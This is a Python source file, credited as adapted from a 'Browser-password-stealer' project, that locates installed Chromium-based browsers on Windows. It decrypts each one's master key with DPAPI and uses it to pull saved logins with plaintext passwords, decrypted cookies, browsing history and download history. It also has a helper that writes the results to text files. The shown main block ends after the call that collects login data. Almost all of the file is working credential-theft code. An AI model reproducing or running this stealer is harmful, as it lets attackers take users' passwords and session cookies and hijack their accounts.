# adapted the idea from : https://github.com/henry-richard7/Browser-password-stealer
# This python program gets all the saved passwords, history, downloads, cookies 
#caution: only retrive from chromium based browser
# requirements
# pip install pypiwin32, pycryptodome

from datetime import datetime
from Crypto.Cipher import AES
import os, json, shutil, base64, sqlite3
from win32crypt import CryptUnprotectData

appdata = os.getenv('LOCALAPPDATA')
browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    #add more chromium based browser if needed
}
def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results


class BrowserData:
    def __init__(self, browser_path=None):
        # browser_path like C:\Users\<username>\AppData\Local\Google\Chrome\User Data
        if not browser_path:
            return
        self.BROWSER_PATH = browser_path
        self.SECRET_KEY = self.get_secret_key(browser_path)
    
    def get_secret_key(self, path:str):
        """
        ::return encryption key
        """
        #return if given bowser User Data path doesn't exists
        #given path look like this : \\Google\\Chrome\\User Data
        try:
            if not path or not os.path.exists(path):
                return
            if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
                return
            
            with open(path + "\\Local State", "r", encoding="utf-8") as localStateFile:
                fileData = localStateFile.read()
            local_state = json.loads(fileData)

            #secret decryption key located in os_crypt dict inside local state file
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:]
            secret_key = CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            return False

    def decrypt_password(self, pass_data:bytes, secret_key=None) -> str:
        """
        ::decrypt and return the given encrypted password data
        """
        secret_key = self.SECRET_KEY
        if not secret_key:
            return
        data = pass_data[3:15]
        payload = pass_data[15:]
        cipher = AES.new(secret_key, AES.MODE_GCM, data)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def save_to_file(self, browser_name, filename, content) -> bool:
        """
        :will create a folder with browser_name
        :will create a text file with filename
        !coution:only accept string as content
        """
        if not browser_name or not filename:
            browser_name = 'browser'
            filename = 'data_file'
        #make a dir with the browser name
        if not os.path.exists(browser_name):
            os.mkdir(browser_name)
        
        if content is not None:
            #create a file with the assosiated data file like: Saved_password.txt
            with open(f'{browser_name}/{filename}.txt', 'wb') as file:
                file.write(content.encode('utf-8'))
            return True
        return False

    def get_login_data(self, browser_path=None, profile='Default', return_type='list') -> list:
        """"
        :self.BROWSER_PATH: like : Browser User Data folder
        :profile: like browser user profile like 'Deafult' user
        :self.SECRET_KEY: secret descryption key
        ::return data as list or dict as require
        :: return all saved login credentials from browser
        """
        login_db = f'{self.BROWSER_PATH}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return
        shutil.copy(login_db, 'login_db')

        try:
            conn = sqlite3.connect('login_db')
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')

            
            data = []
            for row in cursor.fetchall():
                password = self.decrypt_password(row[2])
                url, username, password = row[0], row[1], password

                if return_type == 'dict':
                    data.append({'url': url, 'username': username, 'password': password})
                else:
                    data.append([url, username, password])
            conn.close()
            os.remove('login_db')
            return data

        except Exception as e:
            conn.close()
            os.remove('login_db')
            return []

    def get_web_history(self, browser_path=None, profile='Default', return_type='list') -> list:
        """"
        :self.BROWSER_PATH: like : Browser User Data folder
        :profile: like browser user profile like 'Deafult' user
        ::return data as list or dict as require
        :: return all saved login credentials from browser
        """
        web_history_db = f'{self.BROWSER_PATH}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return
        shutil.copy(web_history_db, 'web_history_db')
        try:
            conn = sqlite3.connect('web_history_db')
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, last_visit_time FROM urls')
            
            data = []
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                url, title, visited_at = row[0], row[1], row[2]
                
                if return_type == 'dict':
                    data.append({'url': url, 'title': title, 'visited_at': visited_at})
                else:
                 data.append([url, title, visited_at])
            conn.close()
            os.remove('web_history_db')
            return data
        except Exception as e:
            conn.close()
            os.remove('web_history_db')
            return []

    def get_cookies(self, browser_path=None, profile='Default', return_type='list') -> list:
        """"
        :self.BROWSER_PATH: like : Browser User Data folder
        :profile: like browser user profile like 'Deafult' user
        :self.SECRET_KEY: secret descryption key
        ::return data as list or dict as require
        :: return all cookies of installed browser
        """
        cookie_db = f'{self.BROWSER_PATH}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return
        shutil.copy(cookie_db, 'cookie_db')

        try:
            conn = sqlite3.connect('cookie_db')
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
            
            data = []
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                cookie = self.decrypt_password(row[3])
                host_key, cookie_name, path, cookie, expire_on = row[0], row[1], row[2], cookie, row[4]

                if return_type == 'dict':
                    data.append({
                            'host_key': host_key, 'cookie_name': cookie_name, 
                            'path': path, 'cookie': cookie, 'expire_on': expire_on
                        })
                else:
                    data.append([host_key, cookie_name, path, cookie, expire_on])
            conn.close()
            os.remove('cookie_db')
            return data
        except Exception as e:
            conn.close()
            os.remove('cookie_db')
            return []

    def get_download_history(self, browser_path=None, profile='Default', return_type='list') -> list:
        """"
        ::return data as list or dict as require
        ::return download history
        """
        downloads_db = f'{self.BROWSER_PATH}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return
        shutil.copy(downloads_db, 'downloads_db')

        try:
            conn = sqlite3.connect('downloads_db')
            cursor = conn.cursor()
            cursor.execute('SELECT tab_url, target_path FROM downloads')
            
            data = []
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                download_url, local_path = row[0], row[1]
                
                if return_type == 'dict':
                    data.append({'url': download_url, 'path': local_path})
                else:
                    data.append([download_url, local_path])
            conn.close()
            os.remove('downloads_db')
            return data
        except Exception as e:
            conn.close()
            os.remove('downloads_db')
            return []


if __name__ == '__main__':
    for browser in installed_browsers():
        browser_path = browsers[browser]
        
        br = BrowserData(browser_path)

        logins_data = br.get_login_data(return_type='dict')
    